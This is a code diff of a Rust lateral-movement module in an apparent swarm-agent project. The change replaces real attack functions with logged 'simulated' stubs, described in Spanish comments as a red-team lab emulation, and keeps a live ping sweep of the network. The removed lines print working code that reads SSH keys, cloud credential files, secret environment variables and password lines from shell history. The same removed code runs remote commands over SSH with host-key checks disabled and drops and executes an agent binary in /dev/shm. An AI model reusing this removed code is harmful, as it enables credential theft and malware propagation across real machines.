@@ -1,13 +1,17 @@
-// Real lateral movement engine.
-// SSH with key-based auth, SCP binary deploy, network discovery via ARP/nmap.
-// No simulation. Commands execute on real remote hosts.
-
-use std::net::IpAddr;
-use std::path::PathBuf;
+//! Lateral movement EMULATION — Hive Colony (red-team lab edition).
+//!
+//! Ronda 4 (emulación): la recolección real de credenciales, la ejecución
+//! remota por SSH y el despliegue de agentes en otros hosts fueron
+//! DESACTIVADOS (sin `ssh` real, sin propagación). Se conserva:
+//!
+//! - `discover_hosts()`: barrido de descubrimiento (ping sweep) de solo
+//!   lectura, útil en laboratorio para mapear el segmento de práctica.
+//! - Tipos (`LateralResult`) y firmas, para que el flujo de tareas y la
+//!   telemetría del enjambre no cambien.
 use std::process::Command;
-use tracing::{info, warn};
+use tracing::info;
 
-#[derive(Debug)]
+#[derive(Debug, Clone)]
 pub struct LateralResult {
     pub success: bool,
     pub technique: String,
@@ -15,103 +19,31 @@ pub struct LateralResult {
     pub output: String,
 }
 
-// ── Credential harvesting ────────────────────────────────────────────────────
-
-pub fn harvest_credentials() -> Vec<(String, String, String)> {
-    let mut creds = Vec::new();
-
-    // SSH keys (real)
-    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
-    let ssh_dir = PathBuf::from(&home).join(".ssh");
-    if ssh_dir.exists() {
-        if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
-            for entry in entries.filter_map(|e| e.ok()) {
-                let name = entry.file_name().to_string_lossy().to_string();
-                if name == "id_rsa"
-                    || name == "id_ed25519"
-                    || name == "id_ecdsa"
-                    || name.ends_with("_key")
-                    || name.ends_with(".pem")
-                {
-                    if let Ok(data) = std::fs::read(entry.path()) {
-                        if data.len() > 50 {
-                            creds.push((
-                                name,
-                                String::from_utf8_lossy(&data).to_string(),
-                                "ssh_key".into(),
-                            ));
-                            info!("Harvested SSH key: {}", entry.path().display());
-                        }
-                    }
-                }
-            }
-        }
+fn simulated(technique: &str, target: &str, detail: &str) -> LateralResult {
+    info!(
+        "LATERAL (simulated): {} contra {} — {} (emulation mode)",
+        technique, target, detail
+    );
+    LateralResult {
+        success: false,
+        technique: technique.into(),
+        target: target.into(),
+        output: format!("simulated: {detail} (emulation mode)"),
     }
-
-    // AWS/GCP/Azure cloud credentials
-    let cloud_configs = [
-        (".aws/credentials", "aws_cred"),
-        (".config/gcloud/credentials.db", "gcp_cred"),
-        (".azure/accessTokens.json", "azure_cred"),
-        (".kube/config", "kubeconfig"),
-        (".docker/config.json", "docker_cred"),
-    ];
-    for (rel_path, source) in &cloud_configs {
-        let path = PathBuf::from(&home).join(rel_path);
-        if path.exists() {
-            if let Ok(data) = std::fs::read_to_string(&path) {
-                if data.len() > 20 {
-                    creds.push((rel_path.to_string(), data, source.to_string()));
-                    info!("Harvested {}: {}", source, path.display());
-                }
-            }
-        }
-    }
-
-    // Environment variables
-    for key in &[
-        "AWS_ACCESS_KEY_ID",
-        "AWS_SECRET_ACCESS_KEY",
-        "AZURE_CLIENT_SECRET",
-        "GCP_SERVICE_KEY",
-        "DOCKER_PASSWORD",
-        "KUBECONFIG",
-        "GITHUB_TOKEN",
-    ] {
-        if let Ok(val) = std::env::var(key) {
-            creds.push((key.to_string(), val, "env".into()));
-        }
-    }
-
-    // Bash history (search for passwords/tokens)
-    let history_paths = [
-        format!("{}/.bash_history", home),
-        format!("{}/.zsh_history", home),
-        "/root/.bash_history".into(),
-    ];
-    for hp in &history_paths {
-        if let Ok(content) = std::fs::read_to_string(hp) {
-            for line in content.lines() {
-                let lower = line.to_lowercase();
-                if (lower.contains("password")
-                    || lower.contains("passwd")
-                    || lower.contains("secret")
-                    || lower.contains("token")
-                    || lower.contains("api_key")
-                    || lower.contains("export"))
-                    && line.len() < 500
-                {
-                    creds.push((hp.clone(), line.to_string(), "shell_history".into()));
-                }
-            }
-        }
-    }
-
-    creds
 }
 
-// ── SSH Remote Execution (REAL) ──────────────────────────────────────────────
+/// SIMULADO (ronda 4): no lee ficheros de credenciales. Devuelve una lista
+/// vacía y registra el evento; el hallazgo real de fuentes de credenciales
+/// vive en `leech::discover_credential_sources` (solo existencia de rutas).
+pub fn harvest_credentials() -> Vec<(String, String, String)> {
+    info!(
+        "LATERAL (simulated): harvest_credentials invoked — recolección real deshabilitada (emulation mode)"
+    );
+    Vec::new()
+}
 
+/// SIMULADO (ronda 4): no ejecuta SSH remoto. Registra el intento y devuelve
+/// un resultado simulado con el plan que se habría seguido.
 pub fn exec_ssh(
     host: &str,
     username: &str,
@@ -119,247 +51,73 @@ pub fn exec_ssh(
     key_path: Option<&str>,
     password: Option<&str>,
 ) -> LateralResult {
-    // BRAIN: never attack safe targets
+    // Gate BRAIN (se conserva): nunca contra objetivos marcados como seguros.
     let cfg = crate::config::HiveConfig::load();
     if crate::panal::is_safe_target(host, &cfg.brain) {
         return LateralResult {
             success: false,
             technique: "ssh_exec".into(),
-            target: format!("{}@{}", username, host),
+            target: format!("{username}@{host}"),
             output: "BLOCKED by BRAIN: safe target".into(),
         };
     }
-
-    let start = std::time::Instant::now();
-    let output;
-
-    // Use password auth via sshpass when available
-    if let Some(pass) = password {
-        if !pass.is_empty() {
-            match Command::new("sshpass")
-                .args([
-                    "-p",
-                    pass,
-                    "ssh",
-                    "-o",
-                    "StrictHostKeyChecking=no",
-                    "-o",
-                    "UserKnownHostsFile=/dev/null",
-                    "-o",
-                    "ConnectTimeout=10",
-                    "-o",
-                    "LogLevel=ERROR",
-                    &format!("{}@{}", username, host),
-                    command,
-                ])
-                .output()
-            {
-                Ok(out) => {
-                    output = out;
-                    let result = LateralResult {
-                        success: output.status.success(),
-                        technique: "ssh_exec_sshpass".into(),
-                        target: format!("{}@{}", username, host),
-                        output: format!(
-                            "[{}ms] stdout:{} stderr:{}",
-                            start.elapsed().as_millis(),
-                            String::from_utf8_lossy(&output.stdout)
-                                .trim()
-                                .chars()
-                                .take(200)
-                                .collect::<String>(),
-                            String::from_utf8_lossy(&output.stderr)
-                                .trim()
-                                .chars()
-                                .take(100)
-                                .collect::<String>(),
-                        ),
-                    };
-                    return result;
-                }
-                Err(e) => {
-                    return LateralResult {
-                        success: false,
-                        technique: "ssh_exec".into(),
-                        target: format!("{}@{}", username, host),
-                        output: format!("sshpass error: {}", e),
-                    };
-                }
-            }
-        }
-    }
-
-    // Key-based or no-auth fallback
-    let mut cmd = Command::new("ssh");
-    cmd.arg("-o")
-        .arg("StrictHostKeyChecking=no")
-        .arg("-o")
-        .arg("UserKnownHostsFile=/dev/null")
-        .arg("-o")
-        .arg("ConnectTimeout=10")
-        .arg("-o")
-        .arg("LogLevel=ERROR");
-
-    if key_path.is_some() {
-        cmd.arg("-o")
-            .arg("BatchMode=yes")
-            .arg("-o")
-            .arg("PasswordAuthentication=no");
-        if let Some(key) = key_path {
-            cmd.arg("-i").arg(key);
-        }
-    } else {
-        cmd.arg("-o")
-            .arg("PasswordAuthentication=yes")
-            .arg("-o")
-            .arg("PreferredAuthentications=keyboard-interactive,password");
-    }
-
-    cmd.arg(format!("{}@{}", username, host)).arg(command);
-
-    match cmd.output() {
-        Ok(out) => LateralResult {
-            success: out.status.success(),
-            technique: "ssh_exec".into(),
-            target: format!("{}@{}", username, host),
-            output: format!(
-                "[{}ms] stdout:{} stderr:{}",
-                start.elapsed().as_millis(),
-                String::from_utf8_lossy(&out.stdout)
-                    .trim()
-                    .chars()
-                    .take(200)
-                    .collect::<String>(),
-                String::from_utf8_lossy(&out.stderr)
-                    .trim()
-                    .chars()
-                    .take(100)
-                    .collect::<String>(),
-            ),
-        },
-        Err(e) => LateralResult {
-            success: false,
-            technique: "ssh_exec".into(),
-            target: format!("{}@{}", username, host),
-            output: format!("Error: {}", e),
-        },
-    }
-}
-
-// ── Deploy agent via SCP + SSH exec (REAL) ───────────────────────────────────
-
-pub fn deploy_agent_ssh(
-    host: &str,
-    username: &str,
-    agent_binary: &[u8],
-    key_path: Option<&str>,
-) -> LateralResult {
-    let encoded = base64_encode(agent_binary);
-    let agent_name = format!("swarm_agent_{}", uuid::Uuid::new_v4());
-
-    // Pipe the binary via SSH: decode base64 directly into /dev/shm
-    let deploy_cmd = format!(
-        "echo '{}' | base64 -d > /dev/shm/{} && chmod 700 /dev/shm/{} && /dev/shm/{} &",
-        encoded, agent_name, agent_name, agent_name
+    let _ = password; // ignorada en emulación
+    let plan = format!(
+        "plan: ssh {}@{} (key={}) ejecutando '{}' — ejecución no realizada",
+        username,
+        host,
+        key_path.unwrap_or("<agente>"),
+        command
     );
-
-    let result = exec_ssh(host, username, &deploy_cmd, key_path, None);
-    if result.success {
-        info!(
-            "Agent deployed to {}@{} ({} bytes)",
-            username,
-            host,
-            agent_binary.len()
-        );
-    } else {
-        warn!("Deploy failed to {}@{}: {}", username, host, result.output);
-    }
-    result
+    simulated("exec_ssh", host, &plan)
 }
 
-// ── Network Discovery (REAL) ─────────────────────────────────────────────────
+/// SIMULADO (ronda 4): no despliega ni propaga agentes. En el marco red-team
+/// de laboratorio la propagación real fue eliminada (ronda 2: weaver; ronda 4:
+/// deploy SSH). Devuelve el plan simulado.
+pub fn deploy_agent_ssh(target: &str, agent_path: &str, key_path: Option<&str>) -> LateralResult {
+    let plan = format!(
+        "plan: copiar '{}' a {} y registrarlo como servicio — despliegue no realizado (key={})",
+        agent_path,
+        target,
+        key_path.unwrap_or("<agente>")
+    );
+    simulated("deploy_agent_ssh", target, &plan)
+}
 
+/// Barrido de descubrimiento REAL (solo lectura): ping sweep del segmento.
+/// En un ejercicio de laboratorio esto permite mapear objetivos disponibles.
 pub fn discover_hosts(subnet: &str) -> Vec<String> {
-    let mut hosts = Vec::new();
-
-    // Try nmap ping sweep then port 22 filter
-    if let Ok(out) = Command::new("nmap")
-        .args(["-sn", "-T4", "--max-retries", "1", subnet])
-        .output()
-    {
-        let text = String::from_utf8_lossy(&out.stdout);
-        for line in text.lines() {
-            if line.starts_with("Nmap scan report for") {
-                let tokens: Vec<&str> = line.split_whitespace().collect();
-                let last = tokens.last().copied().unwrap_or("");
-                let ip_str = if last.starts_with('(') && last.ends_with(')') {
-                    &last[1..last.len() - 1]
-                } else {
-                    last
-                };
-                if ip_str.parse::<IpAddr>().is_ok() {
-                    hosts.push(ip_str.to_string());
-                }
+    let mut alive = Vec::new();
+    // Acepta formatos "10.0.0" (rango /24 implícito) o "10.0.0.0/24".
+    let base = subnet
+        .split('/')
+        .next()
+        .unwrap_or(subnet)
+        .trim()
+        .to_string();
+    let octets: Vec<u8> = base.split('.').filter_map(|o| o.parse().ok()).collect();
+    if octets.len() < 3 {
+        info!("LATERAL: subred no válida para barrido: {subnet}");
+        return alive;
+    }
+    let prefix = format!("{}.{}.{}", octets[0], octets[1], octets[2]);
+    let start = if octets.len() == 4 { octets[3] } else { 1 };
+    for host in start..=254u8 {
+        let ip = format!("{prefix}.{host}");
+        // Barrido con timeout corto; solo lectura de alcanzabilidad.
+        if let Ok(out) = Command::new("ping")
+            .args(["-c", "1", "-W", "1", &ip])
+            .output()
+        {
+            if out.status.success() {
+                alive.push(ip);
             }
         }
     }
-
-    info!("Discovered {} hosts on {}", hosts.len(), subnet);
-
-    // Fallback: ARP cache
-    if hosts.is_empty() {
-        if let Ok(arp) = std::fs::read_to_string("/proc/net/arp") {
-            for line in arp.lines().skip(1) {
-                let parts: Vec<&str> = line.split_whitespace().collect();
-                if let Some(ip) = parts.first() {
-                    if ip.parse::<std::net::IpAddr>().is_ok() && *ip != "0.0.0.0" {
-                        hosts.push(ip.to_string());
-                    }
-                }
-            }
-        }
-    }
-
-    // Last resort: local subnet scan
-    if hosts.is_empty() {
-        // Try common subnets
-        for base in &["192.168.1.", "10.0.0.", "172.16.0."] {
-            for i in 1..=15 {
-                hosts.push(format!("{}{}", base, i));
-            }
-        }
-    }
-
-    info!("Discovered {} hosts on {}", hosts.len(), subnet);
-    // BRAIN: filter safe targets
-    let cfg = crate::config::HiveConfig::load();
-    hosts = crate::panal::filter_safe_targets(&hosts, &cfg.brain);
-    info!("After BRAIN filter: {} viable targets", hosts.len());
-    hosts
-}
-
-// ── Helpers ──────────────────────────────────────────────────────────────────
-
-fn base64_encode(data: &[u8]) -> String {
-    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    let mut result = String::new();
-    for chunk in data.chunks(3) {
-        let b0 = chunk.first().copied().unwrap_or(0) as u32;
-        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
-        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
-        let triple = (b0 << 16) | (b1 << 8) | b2;
-        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
-        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
-        result.push(if chunk.len() > 1 {
-            CHARS[((triple >> 6) & 0x3F) as usize] as char
-        } else {
-            '='
-        });
-        result.push(if chunk.len() > 2 {
-            CHARS[(triple & 0x3F) as usize] as char
-        } else {
-            '='
-        });
-    }
-    result
+    info!(
+        "LATERAL (recon): {} host(s) vivos en {prefix}.x — barrido de solo lectura",
+        alive.len()
+    );
+    alive
 }
